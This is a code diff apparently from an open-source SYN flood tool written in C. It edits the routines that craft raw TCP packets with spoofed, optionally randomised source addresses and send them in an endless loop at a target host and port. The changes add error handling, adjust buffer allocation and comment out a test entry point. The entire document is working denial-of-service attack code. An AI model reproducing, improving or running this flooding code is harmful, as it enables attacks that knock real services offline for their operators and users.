@@ -52,7 +52,13 @@ static int Attack(const pSYNStruct s, const int debug_level)
 {
     // start attack now
     // create a raw socke
+    // the program must run as root
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (socket_fd < 0)
+    {
+        DisplayError("Attack socket failed, %s", strerror(errno));
+        return -1;
+    }
     int i;
     // datagram to represent the packet
     char datagram[40960];
@@ -148,7 +154,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        DisplayError("Error setting IP_HDRINCL. Error number: %d - Error message: %s", errno, strerror(errno));
+        DisplayError("Error setting IP_HDRINCL, %s", strerror(errno));
         //exit(0);
         return -1;
     }
@@ -157,7 +163,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     int len = sizeof(int);
     if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
     {
-        DisplayError("Error setting SO_REUSEADDR. Error number: %d - Error message: %s", errno, strerror(errno));
+        DisplayError("Error setting SO_REUSEADDR, %s", strerror(errno));
         //exit(0);
         return -1;
     }
@@ -182,11 +188,11 @@ static int Attack(const pSYNStruct s, const int debug_level)
         }
         // Data send successfull
         /*
-            else
-            {
-                debug(debug_level, 2, "Attack packet end successful");
-            }
-            */
+        else
+        {
+            debug(debug_level, 2, "Attack packet end successful");
+        }
+        */
     }
 
     return 0;
@@ -197,8 +203,8 @@ int SYNFloodAttack(pInput input)
     // now we start the syn flood attack
     extern void FreeSplitURLBuff(pSplitURLOutput p);
     extern int SplitURL(const char *url, pSplitURLOutput *output);
-    extern int GetRandomIP(char *output);
     extern void FreeRandomIPBuff(char *p);
+    extern int GetRandomIP(char **output);
     extern int GetRandomPort(int *output);
 
     pSYNStruct s = (pSYNStruct)malloc(sizeof(SYNStruct));
@@ -211,9 +217,20 @@ int SYNFloodAttack(pInput input)
         return -1;
     }
     // init the target ip and port
-    if (!strncpy(s->dst_ip, o->host, SYN_FLOOD_IP_BUFFER_SIZE))
+    s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
+    if (!(s->dst_ip))
     {
-        DisplayError("SYNFloodAttack SplitURL failed");
+        DisplayError("SYNFloodAttack malloc failed, %s", strerror(errno));
+        return -1;
+    }
+    if (!memset(s->dst_ip, 0, SYN_FLOOD_IP_BUFFER_SIZE))
+    {
+        DisplayError("SYNFloodAttack memset failed, %s", strerror(errno));
+        return -1;
+    }
+    if (!strncpy(s->dst_ip, o->host, strlen(o->host)))
+    {
+        DisplayError("SYNFloodAttack strncpy failed, %s", strerror(errno));
         return -1;
     }
     s->dst_port = o->port;
@@ -223,10 +240,10 @@ int SYNFloodAttack(pInput input)
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack start sending data...");
     for (;;)
     {
-        // here get the rand ip address
+        // here get the random ip address and port
         if (input->random_sip_address == ENABLE_SIP)
         {
-            if (GetRandomIP(s->src_ip) == -1)
+            if (GetRandomIP(&(s->src_ip)) == -1)
             {
                 DisplayError("SYNFloodAttack GetRandomIP failed");
                 return -1;
@@ -237,12 +254,12 @@ int SYNFloodAttack(pInput input)
                 return -1;
             }
         }
-        // here use one ip address and port
+        // here we will use the default ip address and port
         else
         {
-            if (!strncpy(s->src_ip, SIP_ADDRESS, SYN_FLOOD_IP_BUFFER_SIZE))
+            if (!strncpy(s->src_ip, SIP_ADDRESS, strlen(SIP_ADDRESS)))
             {
-                DisplayError("SYNFloodAttack copy SIP_ADDRESS failed");
+                DisplayError("SYNFloodAttack copy SIP_ADDRESS failed, %s", strerror(errno));
                 return -1;
             }
             s->src_port = (int)SIP_PORT;
@@ -254,13 +271,13 @@ int SYNFloodAttack(pInput input)
             DisplayError("SYNFloodAttack Attack failed");
             return -1;
         }
+        FreeRandomIPBuff(s->src_ip);
     }
-    FreeRandomIPBuff(s->src_ip);
     free(s);
     return 0;
 }
 
-
+/*
 int main(void)
 {
     // for test
@@ -271,3 +288,4 @@ int main(void)
     SYNFloodAttack(p);
     return 0;
 }
+*/
